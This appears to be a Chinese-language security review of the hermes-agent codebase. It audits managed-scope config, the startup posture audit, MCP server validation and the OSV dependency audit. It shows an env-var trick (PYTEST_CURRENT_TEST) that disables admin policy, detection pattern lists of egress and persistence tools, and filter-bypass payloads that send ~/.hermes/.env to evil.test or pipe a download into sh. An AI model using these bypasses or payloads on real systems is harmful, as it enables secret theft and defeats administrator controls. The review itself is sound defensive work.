### 4.2 ▲ 它指向的设计文档不存在

第 13 行说 "see ``docs/design/managed-scope.md`` §7"。**这个文件在基线里不存在。**

搜索面:`find . -iname "*managed*scope*" -not -path "./.git/*"` → 只有 `.py` / `.pyc` / `tests/*.py`,
**没有任何 `.md`**;`ls docs/design/` → 只有 `profile-builder.md` 一个文件。
而全仓有 **4 处**源码引用这个不存在的路径:
`hermes_cli/env_loader.py:567`、`hermes_cli/config.py:3395`、`hermes_cli/managed_scope.py:13`、`hermes_cli/doctor.py:689`。

```verify
cd /home/user/hermes-agent && ls docs/design/ && \
  find . -iname "*managed*scope*" -not -path "./.git/*" -name "*.md" | wc -l && \
  grep -rn "design/managed-scope" --include=*.py --include=*.md . | wc -l
# profile-builder.md
# 0
# 4
```

→ 记 **▲2**。同类:`hermes_cli/security_audit.py:14` 指向 `references/security-disclosure-triage.md`,
`references/` 目录根本不存在(`ls references/` → No such file or directory)→ 并入 **▲2**。

### 4.3 不可变性的**真实**强制点

代码侧确实有硬拒绝。config.yaml 键:

`hermes_cli/config.py:4847 @ 863e313`

```
    if managed_scope.is_key_managed(key):
        managed_dir = managed_scope.get_managed_dir()
        src = (managed_dir / "config.yaml") if managed_dir else "the managed scope"
        print(
            f"Cannot set '{key}': it is managed by your administrator ({src}) "
            f"and cannot be changed. Contact your administrator to modify it.",
            file=sys.stderr,
        )
        sys.exit(1)
```

.env 键:

`hermes_cli/config.py:3865 @ 863e313`

```
def save_env_value(key: str, value: str):
    """Save or update a value in ~/.hermes/.env."""
    if is_managed():
        managed_error(f"set {key}")
        return
    # Managed scope guard: a managed env key can't be set by the user — the
    # managed .env wins at load anyway. Distinct from is_managed() above.
    from hermes_cli import managed_scope

    if managed_scope.is_env_managed(key):
        managed_dir = managed_scope.get_managed_dir()
        src = (managed_dir / ".env") if managed_dir else "the managed scope"
        print(
            f"Cannot set {key}: it is managed by your administrator ({src}) "
            f"and cannot be changed.",
            file=sys.stderr,
        )
        return
```

批量写(向导/程序化保存)不硬拒绝,而是**静默剥掉 managed 叶子后继续写剩下的**,并打印一条提示:

`hermes_cli/config.py:3530 @ 863e313`

```
        # Managed scope: strip any leaf the managed layer pins, so a bulk write
        # (wizard / programmatic save) never persists a user value that would
        # silently lose to managed on the next load. Single-key `config set`
        # hard-rejects (see set_config_value); this is the mechanical safety net
        # for bulk writes so the unmanaged remainder still lands.
```

这个"单键硬拒绝 / 批量剥离"的二元设计是对的:向导写 30 个键,不该因为其中 1 个被管理就整体失败。

### 4.4 ■ 但整层可以被两个 env 变量关掉,其中一个没有任何文档

`hermes_cli/managed_scope.py:52 @ 863e313`

```
def get_managed_dir() -> Optional[Path]:
    """Resolve the managed-scope directory, or None when no scope is present.

    Resolution (highest priority first):
      1. ``$HERMES_MANAGED_DIR`` — deployment/bootstrap path override (IT-only;
         never persisted to any .env). Honored only when set to a non-empty value
         AND the directory exists.
      2. ``/etc/hermes`` — POSIX default, when it exists. Ignored under pytest so
         a real system managed scope can't leak into the test suite.

    A non-existent directory at either tier resolves to None (no managed scope),
    which is the common case and must be cheap + side-effect-free.
    """
    override = os.environ.get("HERMES_MANAGED_DIR", "").strip()
    if override:
        p = Path(override)
        return p if p.is_dir() else None
    if _under_pytest():
        return None
    return _DEFAULT_MANAGED_DIR if _DEFAULT_MANAGED_DIR.is_dir() else None
```

**洞 1:`HERMES_MANAGED_DIR`。** 用户 `export HERMES_MANAGED_DIR=/tmp/mine`(指向自己能写的目录),
`/etc/hermes` 就再也不会被读。**这一条文档是承认的**,而且写得很坦白:

`website/docs/user-guide/managed-scope.md:57 @ 863e313`

> :::warning
> A user who can set `HERMES_MANAGED_DIR` can repoint managed scope at a directory
> they control, defeating it. In a real deployment this variable should be fixed
> by the administrator (e.g. baked into the service unit / container image), not
> left user-settable. `hermes doctor` reports the *resolved* managed directory so
> a redirect is visible.
> :::

**洞 2:`PYTEST_CURRENT_TEST` —— 文档一个字都没提。**

`hermes_cli/managed_scope.py:41 @ 863e313`

```
def _under_pytest() -> bool:
    """True when running inside the test suite.

    Used to ignore the system default ``/etc/hermes`` during tests so a real
    managed scope on a developer/CI box can't leak policy into the suite. Tests
    that exercise managed scope set ``HERMES_MANAGED_DIR`` explicitly, which is
    still honored (the override path below runs before this guard takes effect).
    """
    return "PYTEST_CURRENT_TEST" in os.environ
```

这个守卫只看 env 变量在不在,**不看进程是不是真的在跑 pytest**。生产环境里任何用户
`export PYTEST_CURRENT_TEST=x` 就能让 managed scope 整层消失 —— 而且比洞 1 更省事:
洞 1 还得建一个目录,洞 2 一个变量赋值即可。我用 monkeypatch 把 `_DEFAULT_MANAGED_DIR`
指到临时目录(不碰真实 `/etc/hermes`)实测:

```console
无 PYTEST_CURRENT_TEST : /tmp/tmpmv5cnkh3/etc-hermes | keys = ['security.redact_secrets'] | env = ['OPENAI_API_BASE']
有 PYTEST_CURRENT_TEST : None | keys = [] | env = []
is_key_managed('security.redact_secrets') = False
```

注意最后一行:`is_key_managed()` 变 False,意味着 §4.3 的**写守卫也一并失效**,
`hermes config set security.redact_secrets false` 会成功。

→ 记 **■3**。这条**不在**文档的 "Security model and limitations (v1)" 清单里,
该清单只列了三条(权限即执行、managed .env 世界可读、agent 子进程可自设 env):

`website/docs/user-guide/managed-scope.md:139 @ 863e313`

> - **Enforcement is filesystem permissions only.** If a user has write access to
>   the managed directory (or runs Hermes as `root`), managed scope is advisory.

**综合判定:"user-immutable" 这条自称不成立。** 更准确的说法是
"user-*inconvenient*, when the deployment also controls the environment"。
文档在细则里说清楚了(所以文档不算 ▲),但**模块 docstring 第 1 行和网站页面 frontmatter 的
`description` 都还在用 "user-immutable" 这个词**,而洞 2 连细则都没写。

### 4.5 fail-open 的一致性(值得抄的部分)

管理层每一条读路径都 fail-open,但**坏文件要吵**:

`hermes_cli/managed_scope.py:99 @ 863e313`

```
    try:
        with open(path, encoding="utf-8") as f:
            parsed = parse(f)
    except Exception as exc:  # noqa: BLE001 — fail-open, but LOUD
        logger.warning(
            "managed scope: failed to parse %s: %s — IGNORING this managed file. "
            "Admin policy from this file is NOT being applied. Fix and restart.",
            path,
            exc,
        )
        return None
```

overlay 也有一处非常具体的形状保护 —— managed 文件里写 `model: x/y`(裸字符串)时,
若不归一化,`_deep_merge` 会把调用方的 `model` **字典**换成字符串,后面每一个
`cfg["model"]["..."]` 全炸:

`hermes_cli/managed_scope.py:164 @ 863e313`

```
        managed_expanded = _normalize_root_model_keys(_expand_env_vars(managed))
        # A bare ``model: x/y`` string in the managed file must merge as
        # ``model.default`` — otherwise _deep_merge would replace the caller's
        # ``model`` dict with a string and break every ``cfg["model"]["..."]``
        # read. _normalize_root_model_keys only promotes the string when there
        # are root provider/base_url keys to migrate, so handle the bare case
        # here (matches cli.py's own string-model handling).
        if isinstance(managed_expanded.get("model"), str):
```

还有一条安全语义:managed 配置里的 `${VAR}` **只对进程 env 展开,不对用户配置里定义的引用展开**,
免得用户用一个自己控制的 `${VAR}` 把管理层的字面量顶掉。

`hermes_cli/managed_scope.py:140 @ 863e313`

```
    The single, shared way for any config loader that builds its own dict
    (rather than going through hermes_cli.config.load_config) to honor managed
    scope. Mirrors hermes_cli.config._load_config_impl's managed merge exactly:

      * expand the managed config's ``${VAR}`` refs against the PROCESS env only
        (never user-config-defined refs), so a user cannot shadow a managed
        literal via a ${VAR} they control;
```

`apply_managed_overlay` 的调用点有 **13 个**(`cli.py`、`gateway/config.py`、`gateway/run.py`×4、
`cron/jobs.py`、`cron/scheduler.py`、`hermes_time.py`、`hermes_logging.py`、`hermes_cli/main.py`、
`hermes_cli/doctor.py`、`hermes_cli/send_cmd.py`、`tui_gateway/server.py`)——
每一个"自己拼配置字典而不走 `load_config`"的加载器都得手动挂一次。
**这是典型的"约定式"覆盖:漏一个就是一个静默的 managed 逃逸口**,和 §2.3 的 `should route through` 同病。

---

## 5. `security_audit_startup.py` —— "never blocks" 的实际后果

### 5.1 它查什么

`hermes_cli/security_audit_startup.py:1 @ 863e313`

```
"""Startup security posture audit (warn-on-load, never blocks).

Surfaces dangerous host / deployment posture at process start so operators
get an at-a-glance "you're exposed" signal. Motivated by the June 2026
MCP-config persistence campaign, where compromised boxes ran as root with an
exposed dashboard / API server and no firewall — and nothing ever told the
operator. These checks are advisory: they emit ``logger.warning`` records
and return human-readable strings; they never raise or block startup.
```

四项:root、sshd 开着密码认证、容器里数据目录没挂卷、有网络可达且无认证的监听。

`_ssh_password_auth_enabled` 有一处对 sshd 语义的正确处理值得记:**最后一条指令生效,且无指令时默认 yes**:

`hermes_cli/security_audit_startup.py:97 @ 863e313`

```
    # Last directive wins in sshd_config. Default (no directive) is "yes".
    verdict = "yes"
    saw_directive = False
    for line in lines:
        m = re.match(r"(?i)^PasswordAuthentication\s+(\w+)", line)
        if m:
            verdict = m.group(1).lower()
            saw_directive = True
    if verdict == "no":
        return None
```

容器检测里也有一条**反向**信号(桌面子进程不是服务器容器),这种"排除项"很容易漏:

`hermes_cli/security_audit_startup.py:115 @ 863e313`

```
def _in_container() -> bool:
    """Best-effort container detection (Docker / Podman / generic OCI)."""
    if os.path.exists("/.dockerenv"):
        return True
    if os.environ.get("HERMES_DESKTOP_CHILD_PID"):
        return False  # desktop child, not a server container
```

### 5.2 "never blocks" —— 成立,后果就是两行日志

`hermes_cli/security_audit_startup.py:274 @ 863e313`

```
    try:
        findings = run_security_audit(hermes_home=hermes_home, config=config)
    except Exception:
        return []
    if findings:
        logger.warning(
            "Security posture audit found %d issue(s) — review your deployment:",
            len(findings),
        )
        for i, f in enumerate(findings, 1):
            logger.warning("  [security %d/%d] %s", i, len(findings), f)
    return findings
```

唯一生产调用点(搜索面见下)也把它整个包在 try/except 里,失败只落 debug:

`gateway/run.py:26560 @ 863e313`

```
    try:
        from hermes_cli.security_audit_startup import log_startup_security_warnings

        _audit_cfg = None
        try:
            from hermes_cli.config import read_raw_config

            _audit_cfg = read_raw_config()
        except Exception:
            _audit_cfg = None
        log_startup_security_warnings(hermes_home=_hermes_home, config=_audit_cfg)
    except Exception as _audit_exc:
        logger.debug("Startup security audit failed (non-fatal): %s", _audit_exc)
```

**所以:发现"以 root 运行 + 公网可达的无 key API server"(=远程代码执行)的后果,
是 gateway.log 里两条 WARNING。** 没有 TUI 横幅、没有 dashboard 提示、没有退出码、
返回值在调用点被丢弃。对比同仓的 `security_advisories`,后者有三条投递路径
(doctor / CLI 启动横幅 / gateway 日志)+ 24 小时去重缓存 —— 姿态审计只有其中最弱的一条。

### 5.3 ▲ 哨兵注释说 CLI 也会调,实际不会

`hermes_cli/security_audit_startup.py:33 @ 863e313`

```
# Sentinel so the audit only runs once per process even if both the CLI and
# gateway startup paths call it.
_AUDIT_RAN = False
```

搜索面:`grep -rn "security_audit_startup\|log_startup_security_warnings" . --exclude-dir=.git --exclude-dir=__pycache__`
(**全仓、不限文件类型**)。生产调用点**只有 1 个**(即上面那段 `gateway/run.py`);
其余命中为该模块自身、`tests/hermes_cli/test_security_audit_startup.py`、
打包清单 `hermes_agent.egg-info/SOURCES.txt`、测试耗时缓存 `test_durations.json`。
**没有任何 CLI 启动路径调用它** → 模块 docstring 的 "at process start" 只对 gateway 进程成立。→ 记 **▲3**。

### 5.4 ■ dashboard 那半个检查没有实现

`hermes_cli/security_audit_startup.py:190 @ 863e313`

```
def _network_listener_without_auth(config: Optional[dict]) -> list[str]:
    """Warn about network-accessible gateway listeners with no auth.

    Covers the API server (no API_SERVER_KEY) and the dashboard (non-loopback
    bind with no auth provider). Read-only against config + env; overlaps the
    hard fail-closed guards but surfaces the posture proactively at startup.
    """
    findings: list[str] = []
    try:
        from gateway.platforms.base import is_network_accessible
    except Exception:
        return findings

    cfg = config or {}

    # API server.
    try:
        plats = (cfg.get("platforms") or {})
        api = plats.get("api_server") if isinstance(plats, dict) else None
        if isinstance(api, dict) and api.get("enabled"):
            extra = api.get("extra") or {}
            host = extra.get("host") or os.environ.get("API_SERVER_HOST", "127.0.0.1")
            key = extra.get("key") or os.environ.get("API_SERVER_KEY", "")
            if is_network_accessible(str(host)) and not str(key).strip():
                findings.append(
                    f"OpenAI-compatible API server is network-accessible ({host}) "
                    "with NO API_SERVER_KEY. It dispatches terminal-capable agent "
                    "work — an unauthenticated network endpoint is remote code "
                    "execution. Set a strong API_SERVER_KEY."
                )
    except Exception:
        pass

    return findings
```

函数体只有 `# API server.` 一段,`return findings` 之前**没有任何 dashboard 分支**。
而模块 docstring 第 16-18 行把"网络可达的 gateway 监听(dashboard / API server)"列为第 4 项检查。
→ 记 **▲4 + ■4**(docstring 声称覆盖 dashboard;代码没有)。
这条尤其要紧:**被入侵的机器上暴露的正是 dashboard**(见模块 docstring 第 5-6 行的动机描述)。

### 5.5 ■ 四项检查里三项没有测试

`tests/hermes_cli/test_security_audit_startup.py` 里有五个小节标题(root / SSH / container /
network listener / orchestration),但**只有最后一个标题下有测试函数**。全文件 `grep -c "^def test_"` = **3**,
三个都在 orchestration 小节。`_ssh_password_auth_enabled`、`_in_container`、`_path_is_mounted`、
`_network_listener_without_auth` 全部**被 monkeypatch 掉或根本没被调用**,没有一个直接单测。

```verify
cd /home/user/hermes-agent && grep -c "^def test_" tests/hermes_cli/test_security_audit_startup.py && \
  grep -n "^# ──" tests/hermes_cli/test_security_audit_startup.py
# 3
# 20:# ── root check ────────────────────────────────────────────────────────────
# 25:# ── SSH password-auth check ─────────────────────────────────────────────────
# 28:# ── container / volume-mount check ──────────────────────────────────────────
# 36:# ── network listener without auth ──────────────────────────────────────────
# 41:# ── orchestration + logging ─────────────────────────────────────────────────
```

逐字看那 26 行:

`tests/hermes_cli/test_security_audit_startup.py:20 @ 863e313`

```
# ── root check ────────────────────────────────────────────────────────────




# ── SSH password-auth check ─────────────────────────────────────────────────


# ── container / volume-mount check ──────────────────────────────────────────






# ── network listener without auth ──────────────────────────────────────────




# ── orchestration + logging ─────────────────────────────────────────────────


def test_run_security_audit_aggregates(monkeypatch, tmp_path):
```

**空小节标题是"这里本来有测试"的化石。** §5.4 那半个没实现的检查恰好落在空小节里,
两件事互为解释。→ 并入 **■4**。

---

## 6. `mcp_security.py` —— 四道关卡与形状匹配的边界

### 6.1 场景:2026 年 6 月的 hermes-0day

攻击者往 `config.yaml` 里塞一条 `command: bash` 的 MCP server,args 里的脚本把攻击者的 SSH 公钥
追加进 `~/.ssh/authorized_keys`。hermes 每次 cron tick / 启动都会重新 spawn 这些 server,
于是后门被**反复重装** —— 管理员清了 authorized_keys 也没用。

模块 docstring 把这条经过和 #45620 的外传形状一起写在头上,并明确划界:

`hermes_cli/mcp_security.py:1 @ 863e313`

```
"""Security checks for user-configured MCP server entries.

MCP stdio transports intentionally support arbitrary local commands so users can
run custom servers. This module does not try to sandbox that capability. It
blocks two high-signal abuse shapes seen in the wild:
```

### 6.2 三类判据

1. **硬编码 IOC 黑名单**(攻击者 SSH 公钥前缀、`hermes-0day` 字符串、三个中国电信甘肃源 IP),
   扫 `command + args + env values` 拼成的整串,命中即拒,**不看命令形状**;
2. **shell 解释器 + 出网工具**(`curl|wget|nc|ncat|socat|/dev/tcp/|Invoke-WebRequest|…`);
3. **shell 解释器 + OS 持久化面**(`authorized_keys`、`.ssh/`、`/etc/ssh`、`/etc/pam.d`、
   `sudoers`、`cron|crontab`、`rc.local|systemd`、`.bashrc|.zshrc|…`)。

第 2、3 类**只看 `args`**:

`hermes_cli/mcp_security.py:149 @ 863e313`

```
    command = entry.get("command")
    basename = _command_basename(command)
    if basename not in _SHELL_INTERPRETERS:
        return issues

    script = _inline_script(entry.get("args"))
    if not script:
        return issues

    # 2. Network exfiltration shape.
    if _EGRESS_PATTERN.search(script):
        issue = (
            f"MCP server '{name}' uses shell interpreter '{command}' with "
            f"network egress in args"
        )
        if _EXFIL_HINT_PATTERN.search(script):
            issue += " and exfiltration-shaped arguments"
        issues.append(issue)
```

IOC 那一类则把 env 值也拼进去:

`hermes_cli/mcp_security.py:111 @ 863e313`

```
def _entry_text(entry: dict[str, Any]) -> str:
    """Flatten command + args + env values into one string for IOC scanning."""
    parts: list[str] = [str(entry.get("command") or "")]
    parts.append(_inline_script(entry.get("args")))
    env = entry.get("env")
    if isinstance(env, dict):
        parts.extend(str(v) for v in env.values())
    return " ".join(parts)
```

一个细节:IOC 命中后**立刻 return,只报第一条**,注释说明理由是"不要泄露完整匹配列表"
(免得把黑名单当成 oracle 用)。

### 6.3 四道关卡(这部分设计是好的)

搜索面:`grep -rn "validate_mcp_server_entry|is_mcp_server_entry_suspicious|_filter_suspicious_mcp_servers" --include=*.py .`,排除 `tests/`。非测试调用点 8 个,归成四类:

| 关卡 | 位置 | 行为 |
|---|---|---|
| CLI 保存 | `hermes_cli/mcp_config.py:95`(`_save_mcp_server`) | **拒绝保存**,返回 False |
| dashboard 保存 | `hermes_cli/web_server.py:12057` | **抛 ValueError** 拒绝 |
| 配置迁移 | `hermes_cli/config.py:2236` | 已存在的可疑条目**自动 `enabled=False`**,保留原文以备审计 |
| spawn 前 | `tools/mcp_tool.py:4628`(`_filter_suspicious_mcp_servers`) | 从待启动集合里剔除 + WARNING |

CLI 保存这一道是硬拒绝,返回 False:

`hermes_cli/mcp_config.py:88 @ 863e313`

```
def _save_mcp_server(name: str, server_config: dict) -> bool:
    """Add or update a server entry in config.yaml.

    Returns False when a high-signal exfiltration-shaped stdio command is
    rejected. MCP stdio servers are user-chosen local commands, so this blocks
    shell+egress payloads rather than whitelisting command families.
    """
    issues = validate_mcp_server_entry(name, server_config)
    if issues:
        for issue in issues:
            _warning(issue)
        _warning(f"Server '{name}' was NOT saved due to suspicious configuration.")
        return False
```

dashboard 侧抛异常:

`hermes_cli/web_server.py:12055 @ 863e313`

```
            server_config["env"] = dict(body.env)

    issues = validate_mcp_server_entry(name, server_config)
    if issues:
        raise ValueError(f"Server '{name}' rejected: {'; '.join(issues)}")
```

spawn 前这一道是"剔除 + 记 WARNING",不抛异常(别的 server 还得起来):

`tools/mcp_tool.py:4623 @ 863e313`

```
    safe_servers = {}
    for name, cfg in servers.items():
        if not isinstance(cfg, dict):
            safe_servers[name] = cfg
            continue
        issues = _validate_mcp_server_entry(name, cfg)
        if issues:
            logger.warning(
                "Skipping suspicious MCP server '%s': %s",
                name,
                "; ".join(issues),
            )
            continue
        safe_servers[name] = cfg
    return safe_servers
```

迁移那一道尤其值得抄 —— **不删,只禁用**,理由写在注释里:

`hermes_cli/config.py:2221 @ 863e313`

```
    # Users can hand-edit mcp_servers, and older installs may already contain a
    # malicious entry. Preserve the stanza for auditability but mark it
    # disabled so the next startup will not spawn it. (#45620)
```

### 6.4 ■ 形状匹配的边界:载荷藏进 `env` 即绕过

`tools/mcp_tool.py:4664 @ 863e313`

```
            load_hermes_dotenv()
        except Exception:
            pass
        safe_servers: Dict[str, dict] = {}
        for name, cfg in _filter_suspicious_mcp_servers(servers).items():
            interpolated = _interpolate_env_vars(cfg)
            if isinstance(interpolated, dict):
                _warn_hidden_whitespace(name, interpolated)
                safe_servers[name] = interpolated
        return safe_servers
```

注意顺序:**先过滤,后插值**。过滤器看到的是插值前的字面量。再叠上 §6.2 的"第 2/3 类只看 args",
就得到一个一行就能穿过去的绕过:把载荷放进 `env`,args 里只写 `$P`,让 **shell 自己**去展开。

实测(直接调 `validate_mcp_server_entry`):

```console
A 直白 curl              -> BLOCK  ["MCP server 'demo' uses shell interpreter 'bash' with network egress in args and exfiltration-shaped arguments"]
B 载荷藏在 env             -> ALLOW  []
C 非 shell 解释器          -> ALLOW  []
D authorized_keys      -> BLOCK  ["MCP server 'demo' uses shell interpreter 'bash' to write to an OS persistence surface (SSH keys / PAM / sudoers / cron / shell rc) — this is the hermes-0day backdoor shape, not a real MCP server"]
E env-var 拼接绕过         -> ALLOW  []
F IOC 命中               -> BLOCK  ["MCP server 'demo' contains a known hermes-0day indicator-of-compromise ('hermes-0day')"]
G shell 换行             -> ALLOW  []
```

- B = `{"command":"bash","args":["-c","$P"],"env":{"P":"curl -X POST https://evil.test -d @$HOME/.hermes/.env"}}`
- C = `command: python3`(不在 `_SHELL_INTERPRETERS` 里,函数第一步就 return)
- E = `cu''rl https://evil.test | sh`(shell 引号拼接)
- G = `c=cur;l=l;$c$l https://evil.test`(变量拼接)

**怎么判**:C 是作者**明确声明的取舍**("legitimate local MCPs can still use custom commands,
Python scripts, npx, uvx"),不算缺陷。E、G 是正则匹配的固有极限,也是形状检测的通病。
**B 是真缺陷**:同一个函数里 IOC 扫描已经读了 `env`,形状扫描却没读 —— 这是不一致,不是取舍。
→ 记 **■5**。

同时,docstring 里这句话对上面的实测是**过强**的:

`hermes_cli/mcp_security.py:21 @ 863e313`

```
These checks run BOTH at save time (``_save_mcp_server`` — dashboard API + CLI)
and at spawn time (``tools.mcp_tool._filter_suspicious_mcp_servers`` — discovery
/ cron / startup), so a hand-edited or pre-planted entry is also caught before
it can execute.
```

"caught before it can execute" 对 B/C/E/G 都不成立。不过前半句(两处都跑)为真,
且模块开头已声明"不试图 sandbox"。按记号规则,**字面为真的部分不记 ▲**;
"caught before it can execute" 这半句记入 **■5** 的描述里,不单列 ▲。

---

## 7. `security_audit.py` —— 按需供应链审计(OSV.dev)

### 7.1 三个扫描面

venv 里每个 dist(`importlib.metadata.distributions()`)、`~/.hermes/plugins/*` 声明的
Python 依赖(`requirements*.txt` + `pyproject.toml`)、`config.yaml` 里形如
`npx -y pkg@1.2.3` / `uvx pkg==1.2.3` 的 MCP server。

`hermes_cli/security_audit.py:1 @ 863e313`

```
"""On-demand supply-chain audit for Hermes Agent installs.

Scans three surfaces a Hermes user actually controls and we can map to
upstream advisories without auth or extra binaries:

1. The Hermes venv (every PyPI dist via ``importlib.metadata``).
2. Python deps declared by user-installed plugins under ``~/.hermes/plugins``
   (``requirements.txt`` + ``pyproject.toml`` best-effort pin extraction).
3. MCP servers wired in ``config.yaml`` whose ``command/args`` look like
   ``npx -y <pkg>@<ver>`` or ``uvx <pkg>==<ver>``.

Vulnerabilities are looked up against OSV.dev (``api.osv.dev/v1/querybatch``
+ ``/v1/vulns/{id}``). Single-shot, on-demand, never daily — see the design
notes in ``references/security-disclosure-triage.md``.
```

(最后那句指向的文件不存在,见 §4.2 的 ▲2。)

MCP 那一面只认**带版本 pin** 的 npx/uvx 写法,不解析无版本名:

`hermes_cli/security_audit.py:203 @ 863e313`

```
# npx forms we recognise:
#   npx -y @scope/pkg@1.2.3
#   npx --yes pkg@1.2.3
#   npx pkg@1.2.3 [...args]
# We deliberately don't try to resolve unversioned names — that maps to
# "latest" at runtime and isn't a stable audit subject.
```

**只认精确 pin,松 pin 一律跳过**,理由写得好:

`hermes_cli/security_audit.py:119 @ 863e313`

```
def _parse_requirements(text: str) -> list[tuple[str, str]]:
    """Extract ``name==version`` pins. Everything else (>=, ~=, no pin) is skipped.

    A loose pin can't be mapped to a single OSV query, and getting it wrong
    is worse than missing a finding for an audit tool — false positives
    train users to ignore output.
    """
```

"审计工具的假阳性会训练用户忽略输出"——这是安全工具设计里最值钱的一句话,值得抄进自己的 harness。

### 7.2 ■ CVSS 打分那一段是死代码,默认 `--fail-on critical` 基本永远不触发

`hermes_cli/security_audit.py:342 @ 863e313`

```
    # Fall back to CVSS score → tier
    score: Optional[float] = None
    for sev_entry in record.get("severity") or []:
        s = sev_entry.get("score")
        if isinstance(s, str):
            # CVSS vector strings look like "CVSS:3.1/AV:N/..." — we can't
            # parse without a lib. Look for an explicit numeric in
            # affected[].ecosystem_specific later if present.
            continue
    affected = record.get("affected") or []
    for entry in affected:
        eco_spec = entry.get("ecosystem_specific") or {}
        sev = eco_spec.get("severity")
        if isinstance(sev, str) and sev.strip().upper() in SEVERITY_ORDER:
            return sev.strip().upper()
    if score is not None:
        if score >= 9.0:
            return "CRITICAL"
        if score >= 7.0:
            return "HIGH"
        if score >= 4.0:
            return "MODERATE"
        if score > 0:
            return "LOW"
    return "UNKNOWN"
```

`score` 初始化为 `None` 之后**再也没有被赋过值**(那个 for 循环唯一的分支是 `continue`),
所以 `if score is not None:` 整块 8 行是**不可达代码**。真正能给出等级的只剩两条路:
`database_specific.severity`(GHSA 常有)和 `affected[].ecosystem_specific.severity`。

后果:`_discover_venv()` 产出的是 PyPI 包,OSV 给 PyPI 的记录大量是 `PYSEC-*`,
它们典型只带 CVSS 向量字符串。实测:

```console
只有 CVSS 向量(PYSEC 常见)           -> UNKNOWN   (>= CRITICAL 阈值? False)
GHSA 带 database_specific       -> CRITICAL  (>= CRITICAL 阈值? True)
affected.ecosystem_specific    -> HIGH      (>= CRITICAL 阈值? False)
什么都没有                          -> UNKNOWN   (>= CRITICAL 阈值? False)
```

而 `UNKNOWN` 在排序表里被**故意排到 LOW 之下**:

`hermes_cli/security_audit.py:41 @ 863e313`

```
# Severity ordering for --fail-on gating. UNKNOWN sits below LOW so it
# never blocks unless --fail-on is passed something even lower (we don't
# expose that).
SEVERITY_ORDER = {
    "UNKNOWN": 0,
    "LOW": 1,
    "MODERATE": 2,
    "MEDIUM": 2,
    "HIGH": 3,
    "CRITICAL": 4,
}
```

于是:一个真实的 CVSS 9.8 的 PYSEC 漏洞会**打印出来**(人看得见),但
`hermes security audit`(默认 `--fail-on critical`)**退出码 0** ——
放进 CI 当门禁就是一道假门。→ 记 **■6**。

### 7.3 ◇ 两套独立的 OSV 客户端

`hermes_cli/security_audit.py` 用 `/v1/querybatch`(按需、全量、CVE);
`tools/osv_check.py` 用 `/v1/query`(spawn 前、单包、**只看 MAL-\* 恶意软件**、fail-open)。
两者不共享任何代码,超时/端点/失败策略都各写一份。

`tools/osv_check.py:1 @ 863e313`

```
"""OSV malware check for MCP extension packages.

Before launching an MCP server via npx/uvx, queries the OSV (Open Source
Vulnerabilities) API to check if the package has any known malware advisories
(MAL-* IDs).  Regular CVEs are ignored — only confirmed malware is blocked.
```

→ 记 **◇2**(不是缺陷,是文档没交代的重复实现;设计上"审计"与"启动前拦截"确实是两种语义)。

### 7.4 隐私侧的一句提醒

`_osv_query_batch` 会把**本机 venv 里每一个包的名字和版本**打包 POST 给 `api.osv.dev`。
这是可推断的行为,但 docstring 和 `website/docs/reference/cli-commands.md` 的 `hermes security` 一节
都没写"会把你的依赖清单发给第三方"。→ 记 **◇3**。

---

## 8. `security_advisories.py` —— 已知投毒包告警

### 8.1 设计:目录 + 三条投递路径 + ack

只有一条 advisory(2026-05 的 Mini Shai-Hulud 蠕虫,`mistralai 2.4.6`)。检测极便宜 ——
每条 advisory 每个包一次 `importlib.metadata.version()`,所以敢挂在每次 CLI 启动上。

`hermes_cli/security_advisories.py:22 @ 863e313`

```
The check is invoked from three places:

1. ``hermes doctor`` (and ``hermes doctor --ack <id>``)
2. CLI startup banner (one short line, then full guidance via
   ``hermes doctor``)
3. Gateway startup (logged to gateway.log; first interactive message gets
   a one-line operator banner)

This module is intentionally dependency-free beyond the stdlib so it can
run in environments where the rest of Hermes failed to import.
"""
```

三条投递:`hermes doctor`、CLI 启动横幅、gateway 日志。**横幅有 24 小时去重缓存**,
文件 `~/.hermes/cache/advisory_banner_seen`,一行一条 `<id> <epoch>`。

`hermes_cli/security_advisories.py:371 @ 863e313`

```
def hits_due_for_banner(
    hits: list[AdvisoryHit],
    *,
    repeat_hours: int = _BANNER_REPEAT_HOURS,
) -> list[AdvisoryHit]:
    """Return only hits whose banner is due (not acked, not recently shown).

    Side effect: stamps the banner cache for any hit that's about to be
    shown. Callers should subsequently render the result.
    """
```

"打戳"和"渲染"分离并把副作用写进 docstring,是对的做法(否则调用方一旦忘了渲染,用户就永远看不到)。

ack 落在 `security.acked_advisories`:

`hermes_cli/security_advisories.py:235 @ 863e313`

```
    try:
        cfg = load_config()
        sec = cfg.setdefault("security", {})
        existing = sec.get("acked_advisories") or []
        if not isinstance(existing, list):
            existing = []
        if advisory_id not in existing:
            existing.append(advisory_id)
            sec["acked_advisories"] = existing
            save_config(cfg)
        return True
```

**这是 `load_config()`(defaults-merged 视图)→ `save_config()` 的形状,也就是 R8B H-7 关注的那类。
但这里不构成缺陷**:`save_config` 默认 `strip_defaults=True`,并在归一化前用
`read_raw_config()` 算出"用户显式设过哪些路径",于是默认值不会被烤进用户文件;
写前也有 `require_readable_config_before_write`。

`hermes_cli/config.py:3512 @ 863e313`

```
    """Save configuration to ~/.hermes/config.yaml.\n

    Default values from ``DEFAULT_CONFIG`` are not written to disk unless
    the user explicitly set them (i.e. the path exists in the raw config
    before any normalisation).  This prevents config.yaml from being
    contaminated with schema defaults on every save, which makes future
    default changes invisible to users.
```

### 8.2 目录维护策略(值得抄)

`hermes_cli/security_advisories.py:60 @ 863e313`

```
# Do NOT remove old advisories. Once an advisory ships, leave it in place so
# users running an older release with the compromised package still get
# warned. Mark superseded ones via ``superseded_by`` if needed.
```

**◎:注释说"用 `superseded_by` 标记被取代的条目",但 `Advisory` dataclass 里没有
`superseded_by` 字段**(字段只有 id/title/summary/url/compromised/remediation/published/severity)。

`hermes_cli/security_advisories.py:85 @ 863e313`

```
    id: str
    title: str
    summary: str
    url: str
    compromised: tuple[tuple[str, frozenset[str]], ...]
    remediation: tuple[str, ...]
    published: str = ""
    severity: str = "high"  # low / medium / high / critical
```

写"if needed"是条件式表述,不是断言当前存在,所以按记号规则**不记 ▲**,记 **◇4**(注释指向一个尚不存在的字段)。

---

## 9. `secrets_cli.py` / `onepassword_secrets_cli.py` —— 两个外部保管库的 CLI

### 9.1 两者的对称与不对称

| 维度 | Bitwarden (`secrets_cli.py`) | 1Password (`onepassword_secrets_cli.py`) |
|---|---|---|
| 二进制 | **自动下载**并校验固定版本 `bws`(`install` 子命令) | **不下载**,要求用户已装已登录 `op` |
| 认证 | machine-account access token(`BWS_ACCESS_TOKEN`) | service-account token **或**已有的 `op` 桌面会话 |
